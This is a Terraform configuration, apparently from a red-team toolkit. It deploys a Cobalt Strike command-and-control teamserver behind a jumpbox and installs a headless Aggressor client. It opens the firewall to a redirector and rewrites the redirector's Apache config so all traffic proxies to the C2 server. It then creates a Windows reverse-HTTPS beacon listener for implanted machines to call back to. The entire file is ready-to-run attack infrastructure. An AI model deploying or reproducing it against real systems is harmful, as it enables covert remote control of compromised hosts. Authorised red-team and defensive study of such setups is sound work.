
resource "null_resource" "cobaltstrike" {
  connection {
    host = var.c2_ip
    bastion_host = var.jumpbox_ip
  }

  provisioner "remote-exec" {
    inline = [
        "echo '${var.cobalt-strike-license}' > /root/.cobaltstrike.license",
        "mkdir -p /root/cobaltstrike",
        "echo '#!/bin/bash' > /root/start-cobaltstrike.sh",
        "echo 'cd /root/cobaltstrike/' >> /root/start-cobaltstrike.sh",
        "echo './teamserver ${var.c2_ip} ${var.cobalt-strike-pass} ${var.cobalt-strike-profile}' >> /root/start-cobaltstrike.sh"
    ]
  }

  provisioner "file" {
    source      = "../../modules/cobaltstrike-c2/files/cobaltstrike-dist.tgz"
    destination = "/root/cobaltstrike.tgz"
  }

  provisioner "file" {
    source      = "../../modules/cobaltstrike-c2/files/cobaltstrike.service"
    destination = "/etc/systemd/system/cobaltstrike.service"
  }


  provisioner "remote-exec" {
    scripts = [
      "../../scripts/cobaltstrike.sh"
    ]
  }

  provisioner "local-exec" {
    command = "echo '    LocalForward  ${var.local_proxy} 127.0.0.1:50050' >> ../../ssh_configs/config_${var.name}"
  }
}

# Install Headless Aggressor if "aggressor" parameter is set
resource "null_resource" "c2-aggressor" {
  count = var.aggressor == 0 ? 0 : 1
  depends_on = [ null_resource.cobaltstrike ]
  connection {
    host = var.c2_ip
    bastion_host = var.jumpbox_ip
  }

  provisioner "remote-exec" {
    inline = [
        "mkdir -p /root/aggressor/",
        "echo '#!/bin/bash'                                                                                  > /root/aggressor/start-aggressor.sh",
        "echo 'cd /root/cobaltstrike/'                                                                       >> /root/aggressor/start-aggressor.sh",
        "echo './agscript 127.0.0.1 50050 Aggressor ${var.cobalt-strike-pass} /root/aggressor/aggressor.cna' >> /root/aggressor/start-aggressor.sh"
    ]
  }

  provisioner "file" {
    source      = "../../modules/cobaltstrike-c2/files/aggressor.service"
    destination = "/etc/systemd/system/aggressor.service"
  }

  provisioner "file" {
    source      = "../../modules/cobaltstrike-c2/files/aggressor.cna"
    destination = "/root/aggressor/aggressor.cna"
  }

  provisioner "remote-exec" {
    scripts = [
      "../../scripts/cobaltstrike-aggressor.sh"
    ]
  }
}


resource "null_resource" "ferm" {
  depends_on = [ null_resource.cobaltstrike, null_resource.c2-aggressor ]
  count = var.redir_ip == "" ? 0 : 1
  connection {
    host = var.c2_ip
	  bastion_host = var.jumpbox_ip
  }

  provisioner "remote-exec" {
    inline = [
        "echo 'table filter chain INPUT proto tcp dport (80 443) saddr (${var.redir_ip}) ACCEPT;' > /etc/ferm/ferm.d/https_from_redir.conf",
        "systemctl reload ferm"
    ]
  }
}


resource "null_resource" "proxypass" {
  depends_on = [ null_resource.ferm ]
  connection {
	  host = var.redir_ip
	  bastion_host = var.jumpbox_ip
  }

  provisioner "remote-exec" {
    inline = [
      "cp -p /root/default-ssl.conf /root/default-ssl.conf.`date +%F`.bak",
      "sed -E -i 's;#?ProxyPassMatch.*;ProxyPassMatch ^/(.*) https://${var.c2_ip}/$1;g' /etc/apache2/sites-available/default-ssl.conf",
      "systemctl reload apache2",
    ]
  }
}


locals {
  listener_url = var.listener_url == "" ? var.redir_ip : var.listener_url
  listener_beacons = var.listener_beacons == "" ? local.listener_url : var.listener_beacons
}

# reference https://blog.cobaltstrike.com/2021/07/02/create-listeners-with-an-aggressor-script-listener_create_ext/
resource "null_resource" "c2-listener" {
  depends_on = [ null_resource.cobaltstrike, null_resource.c2-aggressor, null_resource.ferm ]
  count = var.redir_ip == "" ? 0 : 1

  connection {
    host = var.c2_ip
    bastion_host = var.jumpbox_ip
  }

  provisioner "remote-exec" {
    inline = [
        "echo 'listener_create_ext(\"https\", \"windows/beacon_https/reverse_https\", %(host => \"${local.listener_url}\", port => 443, beacons => \"${local.listener_beacons}\")); sleep(5000); closeClient();' > /tmp/listener-https.cna",
        "(cd /root/cobaltstrike; ./agscript 127.0.0.1 50050 'Listener-https' ${var.cobalt-strike-pass} /tmp/listener-https.cna)",
    ]
  }
}